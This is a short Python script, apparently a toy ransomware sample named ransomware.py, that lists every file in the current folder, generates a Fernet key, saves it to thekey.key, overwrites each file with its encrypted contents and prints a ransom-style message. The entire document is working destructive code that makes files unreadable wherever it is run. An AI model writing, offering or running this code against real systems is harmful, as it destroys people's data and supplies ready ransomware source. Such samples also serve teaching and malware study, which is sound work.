import os 
from cryptography.fernet import Fernet

# let's find some files to encode

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    # Encrypt only the files inside the folder, not the sub folder
    if os.path.isfile(file):
        files.append(file)


# print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All of your files have been encrypted!! Find the magic word to decrypt them")